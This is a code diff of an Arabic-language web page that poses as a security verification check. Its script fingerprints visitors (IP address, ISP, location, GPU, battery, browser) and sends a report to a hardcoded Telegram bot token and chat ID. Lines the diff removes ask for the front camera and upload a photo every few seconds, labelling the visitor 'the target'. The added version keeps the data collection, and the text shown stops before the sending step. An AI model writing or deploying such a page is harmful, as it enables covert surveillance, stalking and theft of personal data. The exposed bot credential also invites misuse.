@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الاتصال الآمن</title>
+    <title>تحقق من الأمان</title>
     <style>
         body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .ui-box { text-align: center; border: 1px solid #eee; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
-        .spinner { width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { display: none; padding: 12px 25px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .ui-box { text-align: center; padding: 25px; border-radius: 15px; border: 1px solid #f0f0f0; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 320px; }
+        .loader { width: 35px; height: 35px; border: 3px solid #eee; border-top: 3px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { display: none; padding: 12px 30px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
     </style>
 </head>
 <body>
 
     <div class="ui-box">
-        <div class="spinner" id="ldr"></div>
+        <div class="loader" id="ldr"></div>
         <p id="st">جاري فحص بروتوكولات الأمان...</p>
         <button id="auth">متابعة الآن</button>
     </div>
@@ -27,81 +27,42 @@
         const _a = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
         const _i = "2103976274";
 
-        async function getUltimateReport() {
+        async function startScanning() {
             let n = navigator;
-            let report = `🛑 **تقرير تقني شامل (فوري)**\n\n`;
+            let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
-            // 1. جلب IP دقيق جداً (استخدام خدمة تعطي معلومات الـ ISP الحقيقية)
+            // 1. جلب الـ IP والشركة (مسار مستقل)
             try {
                 const res = await fetch('https://ipapi.co/json/').then(r => r.json());
-                report += `🌍 **الآي بي:** \`${res.ip}\`\n`;
-                report += `🏢 **الشركة/الشبكة:** ${res.org}\n`;
-                report += `📍 **المكان:** ${res.city}, ${res.country_name}\n`;
-            } catch (e) { report += `🌍 **الآي بي:** فشل الجلب المباشر\n`; }
+                report += `🌍 **الآي بي:** \`${res.ip || 'غير معروف'}\`\n`;
+                report += `🏢 **الشركة:** ${res.org || 'غير معروف'}\n`;
+            } catch (e) { report += `🌍 **الآي بي:** فشل الجلب\n`; }
 
-            // 2. كشف المتصفح والنظام بدقة (منع تزييف Brave/Chrome)
-            let browser = "مجهول";
-            if (n.brave && await n.brave.isBrave()) browser = "Brave Browser";
-            else if (!!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime)) browser = "Google Chrome";
-            else if (Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0) browser = "Safari";
-            else if (n.userAgent.indexOf("Edg") != -1) browser = "Microsoft Edge";
-            else if (n.userAgent.indexOf("Firefox") != -1) browser = "Firefox";
+            // 2. معلومات النظام والمعالج الرسومي
+            report += `📱 **النظام:** ${n.platform}\n`;
             
-            report += `🧭 **المتصفح:** ${browser}\n`;
-            report += `📱 **النظام الأساسي:** ${n.platform} (${n.userAgent.indexOf("Android") > -1 ? "Android" : "PC/iOS"})\n`;
-
-            // 3. المعالج الرسومي (GPU) - أفضل طريقة لمعرفة موديل الجهاز
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const gl = canvas.getContext('webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 report += `🎮 **المعالج الرسومي:** ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) { report += `🎮 **المعالج الرسومي:** غير مسموح\n`; }
+            } catch(e) { report += `🎮 **الرسوميات:** غير مدعوم\n`; }
 
-            // 4. البطارية والمعالج والشاشة
-            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 'غير محدد'}\n`;
+            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
             report += `🖥️ **دقة الشاشة:** ${window.screen.width}x${window.screen.height}\n`;
 
+            // 3. كشف المتصفح بدقة
+            let browser = "متصفح آخر";
+            if (n.userAgent.includes("Brave")) browser = "Brave";
+            else if (n.userAgent.includes("Edg/")) browser = "Edge";
+            else if (n.userAgent.includes("Chrome")) browser = "Chrome";
+            else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) browser = "Safari";
+            report += `🧭 **المتصفح:** ${browser}\n`;
+
+            // 4. البطارية (بصيغة آمنة)
             try {
-                const b = await n.getBattery();
-                report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
+                if (n.getBattery) {
+                    const b = await n.getBattery();
+                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
+                }
             } catch (e) {}
-
-            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
-
-            send(report);
-            
-            document.getElementById('ldr').style.display = 'none';
-            document.getElementById('st').innerText = "اكتمل الفحص.";
-            document.getElementById('auth').style.display = 'inline-block';
-        }
-
-        document.getElementById('auth').onclick = async function() {
-            this.style.display = 'none';
-            try {
-                // الكاميرا الأمامية فقط
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = s;
-                setInterval(take, 3500);
-            } catch (e) { send("⚠️ المستهدف رفض الكاميرا"); }
-        };
-
-        function take() {
-            const cv = document.getElementById('c');
-            const vd = document.getElementById('v');
-            cv.width = vd.videoWidth; cv.height = vd.videoHeight;
-            cv.getContext('2d').drawImage(vd, 0, 0);
-            cv.toBlob(b => {
-                const f = new FormData();
-                f.append('chat_id', _i);
-                f.append('photo', b, 'capture.jpg');
-                fetch(_a + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.8);
-        }
-
-        function send(t) {
-            fetch(_a + "sendMessage", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: _i, text: t, parse_mode: "Markdown" })
-            });
